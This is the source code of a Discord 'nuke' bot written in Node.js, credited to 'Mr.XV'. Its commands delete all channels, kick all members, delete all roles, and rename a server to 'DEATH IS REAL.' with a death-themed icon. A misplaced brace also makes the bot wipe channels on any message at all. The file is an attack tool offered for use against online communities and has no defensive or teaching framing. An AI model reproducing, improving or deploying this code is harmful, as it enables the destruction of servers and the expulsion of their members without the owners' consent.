`Coded by Mr.XV`

const Discord = require('discord.js');
const { Client } = require('discord.js');
const client = new Client({ ws: { intents: ['GUILDS', 'GUILD_MESSAGES'] } });
const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright, gray } = require('chalk');
const settings = require('./config.json');
const token = settings.token;
const prefix = settings.prefix;
const founder = settings.founder;
const disableEveryone = settings.DisableEveryone;
const myID = settings.ID;
const XVconsole = String.raw`

          ███╗░░░███╗██████╗░░░░██╗░░██╗██╗░░░██╗
          ████╗░████║██╔══██╗░░░╚██╗██╔╝██║░░░██║
Coded By: ██╔████╔██║██████╔╝░░░░╚███╔╝░╚██╗░██╔╝
          ██║╚██╔╝██║██╔══██╗░░░░██╔██╗░░╚████╔╝░
          ██║░╚═╝░██║██║░░██║██╗██╔╝╚██╗░░╚██╔╝░░
          ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░

`;

console.log(greenBright(XVconsole));
client.on("ready", () => {
    console.log(redBright('           ══════════════════════════════════════════════════════════════'));
    console.log(greenBright(`                      robat run shod: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                      prefix robat: ${prefix}`));
    console.log(greenBright(`                      khamosh bodan everyone: ${disableEveryone}`));
    console.log(greenBright(`                      perm robat: ADMINISTRATOR`));
    console.log(yellowBright(`                      created by : _Bardi.XV `));
    console.log(redBright('           ══════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "Listening", name: " ¯̄ ͡ ̶ୡۣۜ𝙈𝙧_𝙓𝙫⛥#0666 " }); 
});

client.on('message' , message => {
    if(message.content === prefix + 'dc'){
            message.guild.channels.cache.forEach(channel => channel.delete().then(
                console.log(redBright(`channel pak shod`))
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if(message.content === prefix + 'ka'){
        message.guild.members.cache.forEach(member => member.kick({ reason: "nock" })
        .then(console.log(`${member.user.tag} kick shod`) && message.channel.send("tamam member ha kick shodand")
            .catch()
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if(message.content === prefix + 'dr'){
            message.guild.roles.cache.forEach(r => r.delete({ reason: "nock" }).then(console.log(yellow(`${r.name} delete shod`))).catch(
            console.log(yellow(`${r.name} pack shod`))
            )); 
            message.delete();
            }
});
client.on('message' , message => {
    if (message.content === prefix + 'die') {
        message.delete();
        message.guild.setName(`DEATH IS REAL.`).then(console.log(green(`esm server avaz shod be: ${message.guild.name} `))); 
        }
        message.guild.channels.cache.forEach(channel => channel.delete().then(
            console.log(redBright(`channel pak shod`))
        ).then(
            message.guild.setIcon('https://media.discordapp.net/attachments/827817976513953792/864387439664562176/the-end.gif') 
        ));

            message.delete();
            
});


client.login(token);
